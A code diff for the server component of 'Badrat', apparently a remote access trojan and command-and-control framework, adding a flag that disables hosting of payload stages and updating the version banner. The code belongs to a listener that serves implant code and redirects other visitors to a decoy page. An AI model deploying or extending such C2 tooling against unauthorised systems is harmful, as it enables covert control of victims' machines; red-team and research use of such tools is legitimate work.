@@ -29,12 +29,14 @@ parser.add_argument("-s", "--ssl", help="Start listener using HTTPS instead of H
 parser.add_argument("-v", "--verbose", help="Start Badrat in debug/verbose mode for troubleshooting", default=False, action="store_true", dest="verbose")
 parser.add_argument("-r", "--redirect", help="Website to redirect non-rat clients to", default="en.wikipedia.org/wiki/Rat", action="store", dest="redirect_url")
 parser.add_argument("-n", "--no-payload-encryption", help="Disable stager payload encryption. Serve raw payloads instead", default=False, action="store_true", dest="no_payload_encryption")
+parser.add_argument("-d", "--disable-staging", help="Disable payload staging. Flask server won't host payloads", default=False, action="store_true", dest="disable_staging")
 args = parser.parse_args()
 port = args.port
 ssl = args.ssl
 verbose = args.verbose
-redirect_url = args.redirect_url
 no_payload_encryption = args.no_payload_encryption
+disable_staging = args.disable_staging
+redirect_url = args.redirect_url
 if(not str.startswith("http://", redirect_url) or not str.startswith("https://", redirect_url)):
     redirect_url = "http://" + redirect_url
 
@@ -163,7 +165,7 @@ def pretty_print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.6.10 fixed readline history  "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.6.11 payload staging disable "`
     """
     pretty_print(banner)
 
@@ -422,7 +424,7 @@ def serve_server(port=8080):
     def badrat_get(path):
         # Check to see if we are serving ad-hoc ratcode -- GET version
         ip_addr = request.environ['REMOTE_ADDR']
-        if(str.startswith(path, rand_path + "/b.")):
+        if(str.startswith(path, rand_path + "/b.") and not disable_staging):
             ratType = path.split(".")[1]
             return(send_ratcode(ratType=ratType, ip_addr=ip_addr))
         elif(verbose):
@@ -434,7 +436,7 @@ def serve_server(port=8080):
     def badrat_comms(path):
         ip_addr = request.environ['REMOTE_ADDR']
         # Check to see if we are serving ad-hoc ratcode -- POST version
-        if(str.startswith(path, rand_path + "/b.")):
+        if(str.startswith(path, rand_path + "/b.") and not disable_staging):
             ratType = path.split(".")[1]
             return(send_ratcode(ratType=ratType, ip_addr=ip_addr))
 
@@ -489,7 +491,10 @@ def serve_server(port=8080):
     if(verbose):
         pretty_print("[v] Starting badrat in verbose mode. Prepare to have your screen flooded.")
 
-    pretty_print("[*] Ad-Hoc ratcode servable from path: " + colors("/" + rand_path + "/b.<rat_type>") + " via GET or POST")
+    if(not disable_staging):
+        pretty_print("[*] Ad-Hoc ratcode servable from path: " + colors("/" + rand_path + "/b.<rat_type>") + " via GET or POST")
+    else:
+        pretty_print("[!] Whoah! You chose to disable hosted payload stages. Payload staging won't work.")
 
     # Run the listener. Choose between HTTP and HTTPS based on if --ssl was specfied
     if(ssl):
@@ -501,6 +506,9 @@ def serve_server(port=8080):
         app.run(host="0.0.0.0", port=port)
 
 def get_stagers(lhost):
+    if(disable_staging):
+        pretty_print("You disabled payload staging! Restart Badrat server without '--disable-staging' to use the 'stagers' command")
+        return
     protocol = "http"
     if(ssl):
         protocol = "https"
